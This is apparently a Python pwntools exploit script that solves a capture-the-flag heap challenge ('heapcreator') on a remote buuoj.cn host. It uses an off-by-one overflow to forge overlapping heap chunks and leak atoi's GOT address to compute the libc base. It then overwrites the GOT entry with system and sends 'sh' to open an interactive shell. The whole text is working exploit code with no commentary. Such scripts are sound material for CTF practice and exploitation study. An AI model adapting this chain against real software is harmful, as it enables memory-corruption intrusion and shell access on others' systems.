from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./heapcreator"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 28153)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con):
    sa("Your choice :", "1")
    sa("Size of Heap : ", str(size))
    sa("Content of heap:", con)

def edit(index, con):
    sa("Your choice :", "2")
    sa("Index :", str(index))
    sa("Content of heap : ", con)

def show(index):
    sa("Your choice :", "3")
    sa("Index :", str(index))

def free(index):
    sa("Your choice :", "4")
    sa("Index :", str(index))


# off by one

# leak got
add(0x18, "0")
add(0x10, "1")
add(0x10, "2")
pad = cyclic(0x10)+p64(0)+p8(0x61)
edit(0, pad)
free(1)
add(0x50, "1")

pro = ELF("./heapcreator")
atoi_g = pro.got["atoi"]

pad = cyclic(0x40)+p64(0xa)+p64(atoi_g)
edit(1, pad)
show(2)
rud("Content : ")
info = u64(rud("\n").ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["atoi"]
system = base+libc.sym["system"]
print("base: ", hex(base))

# alter got
pad = p64(system)
edit(2, pad)

# attack
sa("Your choice :", b"sh\x00\x00")

shell()


